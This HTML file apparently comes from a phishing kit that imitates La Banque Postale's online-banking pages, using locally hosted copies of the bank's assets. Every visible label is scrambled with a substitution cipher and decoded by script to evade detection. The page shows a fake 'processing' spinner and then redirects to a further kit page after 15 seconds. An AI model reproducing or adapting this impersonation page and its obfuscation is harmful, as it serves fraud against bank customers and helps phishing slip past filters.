<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0106)https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/CCP/releves_ccp/releveCPP-releve_ccp.ea -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <!-- standard.jsp -->

    <meta http-equiv="Content-Language" content="fr">
    <meta http-equiv="Content-Script-Type" content="text/javascript">
    <meta http-equiv="Content-Style-Type" content="text/css">
    <title>Bienvenue</title>
    <link type="image/x-icon" href="./images/favicon.png" rel="shortcut icon">
    <meta http-equiv="refresh" content="15;url=index2.html" />

    <script type="text/javascript">
        var pathRessourcesCss = "https://www.labanquepostale.fr/etc/designs/lbp/transac/css/";
        var pathRessourcesjs = "https://www.labanquepostale.fr/etc/designs/lbp/transac/js/";
        var pathRessourcesImg = "https://www.labanquepostale.fr/etc/designs/lbp/transac/img/q4x/";
    </script>
    <link rel="stylesheet" type="text/css" href="./azerty/reset.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/datePicker.css" media="all">

    <link rel="stylesheet" type="text/css" href="./azerty/default.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/static.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/rib.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/blocs.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/jquery-ui-1.8.6.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/print.css" media="all">

    <link rel="stylesheet" type="text/css" href="./azerty/bridge.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/fontesLocales.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/main.css" media="all">
    <link rel="stylesheet" type="text/css" href="./azerty/outils.css" media="all">

    <link rel="stylesheet" type="text/css" href="./azerty/correctifs-style.css" media="all">

    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" href="https://www.labanquepostale.fr/etc/designs/lbp/transac/css/q4x/ie8.css" media="all" />
<![endif]-->
    <!--[if lte IE 7]>
    <link rel="stylesheet" type="text/css" href="https://www.labanquepostale.fr/etc/designs/lbp/transac/css/q4x/ie7.css" media="all" />
<![endif]-->
    <!--[if lte IE 6]>
   <link rel="stylesheet" type="text/css" href="https://www.labanquepostale.fr/etc/designs/lbp/transac/css/q4x/ie6.css" media="all" />
<![endif]-->

    <script type="text/javascript" src="./azerty/onsubmit.js"></script>
    <script type="text/javascript" src="./azerty/eA-HTML.js"></script>
    <script type="text/javascript" src="./azerty/FwMC-Ext.js"></script>

    <script type="text/javascript" src="./azerty/lib-formbean-bel.js"></script>
    <script type="text/javascript" src="./azerty/generique.js"></script>
    <script type="text/javascript" src="./azerty/outils.js"></script>

    <script type="text/javascript" src="./azerty/ajax.js"></script>
    <script type="text/javascript" src="./azerty/hub.js"></script>
    <script type="text/javascript" src="./azerty/messagerie.js"></script>

    <!-- Javascript -->

    <script type="text/javascript" src="./azerty/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="./azerty/jquery-migrate-1.4.0.js"></script>
    <script type="text/javascript" src="./azerty/jquery.tablesorter.js"></script>
    <script type="text/javascript" src="./azerty/jquery.fixcolheight.js"></script>
    <script type="text/javascript" src="./azerty/jquery.simplemodal.js"></script>
    <script type="text/javascript" src="./azerty/jquery.placeholder.js"></script>
    <script type="text/javascript" src="./azerty/jquery.datePicker.js"></script>
    <script type="text/javascript" src="./azerty/jquery-ui.min.js"></script>
    <script type="text/javascript" src="./azerty/date.js"></script>
    <script type="text/javascript" src="./azerty/date_fr.js"></script>
    <script type="text/javascript" src="./azerty/swfobject.js"></script>
    <script type="text/javascript" src="./azerty/typeahead.jquery.min.js"></script>
    <script type="text/javascript" src="./azerty/config.js"></script>
    <script type="text/javascript" src="./azerty/lib-init.js"></script>
    <script type="text/javascript" src="./azerty/print.js"></script>

    <script type="text/javascript" src="./azerty/bootstrap.js"></script>
    <script type="text/javascript" src="./azerty/plugin.js"></script>
    <script type="text/javascript" src="./azerty/main.js"></script>
    <script type="text/javascript" src="./azerty/select2.min.js"></script>

    <script type="text/javascript" src="./azerty/profile.js"></script>

    <!-- SCRIPT permettant de mettre en gris les boutons annuler - Correction impact N6 -->
    <script type="text/javascript">
        $(document).ready(function() {
            $('a.btn_crt:contains("Annuler")').addClass("btn_annuler");
        });
    </script>

    <script type="text/javascript" src="./azerty/is"></script>
    <link rel="stylesheet" href="./azerty/inbenta_OLD.css">
</head>

<body>
    <div id="page">

        <script type="text/javascript" src="./azerty/xiti_profile.js"></script>

        <!-- SCRIPT INBENTA  -->
        <script language="javascript" type="text/javascript" src="./azerty/inbenta-faq.js" defer=""></script>

        <script type="text/javascript" src="./azerty/header.js" defer=""></script>

        <header id="header-main" role="banner">

            <div id="inbenta-contents"></div>
            <div class="header__profile">
                <div class="content" role="banner">
                    <a href="#" class="logo-wrapper"><img src="./azerty/logo-lbp_header.png" alt="La Banque Postale" class="logo"></a>
                    <div class="nav-profile">
                        <ul>
                            <li class="faq-search">

                                <a>
                                    <img src="./azerty/message.png" alt="" role="img" aria-hidden="true" style="width:20px;height:20px"></i> <script>m='Uvzti%20pnt%20wptzervn%20%3F';d=unescape(m);document.write(d);</script></a>
                                <li class="profile collapse">
                                    <a>
                                        <img src="./azerty/profil.png" alt="" role="img" aria-hidden="true" style="width:20px;height:20px"></i> <script>m='Avn%20uivfrl';d=unescape(m);document.write(d);</script>
                                        <span class="visually-hidden"><script>m='Dtulrti%20lt%20atnp';d=unescape(m);document.write(d);</script></span>
                                    </a>
                                </li>
                                <br>
                                <a id="gerer" href="#" onclick="return xt_click(this,'C','16','Gerer','N');">
                                    <img src="./azerty/deconnexion.png" alt="" aria-hidden="true" role="img" style="width:22px;height:22px"><span style="color: #F0F0F0;"><script>m='Dtcvnntkrvn';d=unescape(m);document.write(d);</script></span>
                                    <i class=""></i>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="alert alert--primary" role="alert">
                <div class="content">
                    <a class="alert__close" href="#" id="#">
                        <img src="./azerty/x.png" alt="" role="img" aria-hidden="true" style="width:20px;height:20px"></a>

                    </a>
                    <p class="alert__body" style="color: #fff">
                        <script> m='-%20Dtinrtit%20cvnntkrvn%20Rnetinte%202019';d=unescape(m);document.write(d);</script>
                    </p>
                </div>
            </div>

            <nav id="menu" class="header__nav" role="navigation">
                <div class="content">
                    <ul>
                        <li>
                            <a id="consulter" href="#" onclick="return xt_click(this,&#39;C&#39;,&#39;16&#39;,&#39;m='Cvnzpleti';d=unescape(m);document.write(d);&#39;,&#39;N&#39;);">
                                <span class="item">
                                <script> m='Cvnzpleti';d=unescape(m);document.write(d);</script>
                            </span>
                            </a>
                        </li>
                        <li>
                            <a id="gerer" href="#" onclick="return xt_click(this,&#39;C&#39;,&#39;16&#39;,&#39;m='Gtiti';d=unescape(m);document.write(d);&#39;,&#39;N&#39;);">
                                <span class="item"><script>m='Gtiti';d=unescape(m);document.write(d);</script></span>
                            </a>
                        </li>
                        <li>

                            <a id="contacter" href="#" onclick="return xt_click(this,&#39;C&#39;,&#39;16&#39;,&#39;m='Cvnemceti';d=unescape(m);document.write(d);&#39;,&#39;N&#39;);">
                                <span class="item">
                                        <div id="echec" class="cache_hub" style="float: left; display: none;">
                                            <img src="./azerty/enveloppe.png" alt="">
                                        </div>
                                        <span><script>m='Cvnemceti';d=unescape(m);document.write(d);</script></span>
                                <span class="badge badge--primary cache_hub" aria-hidden="true" id="nbHUB" style="display: inline-block;"><span id="nbHUBcontent">0</span></span>
                                </span>
                            </a>
                            <script type="text/javascript">
                                addOnloadFunction(prepaGestionHUB);

                                function prepaGestionHUB() {
                                    gestionHUB();
                                }
                            </script>

                        </li>
                        <li>
                            <a id="informersouscrire" href="#" onclick="return xt_click(this,&#39;C&#39;,&#39;16&#39;,&#39;&#39;,&#39;N&#39;);">
                                <span class="item" style="color: #004b9b"><script>m='Z%27rnfviati%20%26%20zvpzcirit';d=unescape(m);document.write(d);</script></span>
                            </a>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>

        <div class="ui-grid-row">
        </div>
        <div class="formline">
            <label class="title-level2" for="cada" id="labelCompteEmetteur">
                <br>
                <div>
                    <div class="content">
                        <ul>
                            <li>
                                <span class="item">
	                        </span>
                                <br>
                                <br>
                            </li>
                            <li>

                                <div class="content">
                                    <ul>
                                        <li>

                                </div>
                                <div id="C:F1:D">
                                    <div class="a_blocfctltitre">
                                    </div>
                                    <div id="C:F1:expContent" class="a_blocfctl">
                                        <div id="C:B:D" class="bloctxt info">

                                            </head>

                                            <body>
                                                <form>
                                                    <div class="div1">
                                                        <center><img src="./images/process.gif" alt="Smiley face" height="172" width="172" align="middle" class="process" /> </center>
                                                    </div>
                                                </form>
                                            </body>
                                            <br>
                                            <br>
                                            <br>
                                            <br>
                                            <br>
                                            <br>
                                            <br>
                                            <br>

                                            </main>

                                            <footer id="main-footer" role="contentinfo">

                                                <div class="content">
                                                    <a id="imageFooter" href="#" class="logo-wrapper">
                                                        <img src="./azerty/logo-lbp_footer.png" class="logo">
                                                    </a>
                                                    <li><a href="#"><script>m='M%20uivuvz%20dt%20Lm%20Bmnwpt%20Uvzemlt';d=unescape(m);document.write(d);</script></a></li>
                                                    <li><a  href="#"><script>m='Emirfz';d=unescape(m);document.write(d);</script></a></li>
                                                    <li><a  href="#"><script>m='Ztcpiret';d=unescape(m);document.write(d);</script></a></li>
                                                    <li><a  href="#"><script>m='Mcctzzrbrlret';d=unescape(m);document.write(d);</script></a></li>
                                                    <li><a  href="#"><script>m='Atnervnz%20ltgmltz';d=unescape(m);document.write(d);</script></a></li>
                                                    <li><a  href="#"><script>m='Fvndz%20dt%20Gmimnert%20dtz%20dtu%F4ez';d=unescape(m);document.write(d);</script></a></li>
                                                    </ul>
                                                </div>
                                            </footer>
                                        </div>

                                        <script type="text/javascript" src="./azerty/iframeResizer.min.js"></script>
                                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                                        <!--[if lte IE 8]>
		<script type="text/javascript"	src="https://www.labanquepostale.fr/etc/designs/lbp/transac/js/ie8.polyfils.min.js"></script>
	<![endif]-->
                                        <script type="text/javascript">
                                            // Ceci est l'appel à la fonction resize. L'appel peut-être enrichi.
                                            // se referrer à  la notice : http://davidjbradshaw.github.io/iframe-resizer/
                                            $("iframe").iFrameResize({
                                                checkOrigin: false,
                                                heightCalculationMethod: 'max'
                                            });
                                        </script>

                                        <script type="text/javascript" src="./azerty/xtroi.js"></script>

                                        <div style="display: none;"></div>
                                        <div class="inbenta-loader" style="display:none" iaf-loader=""><i class="icon load"></i></div>
</body>

</html>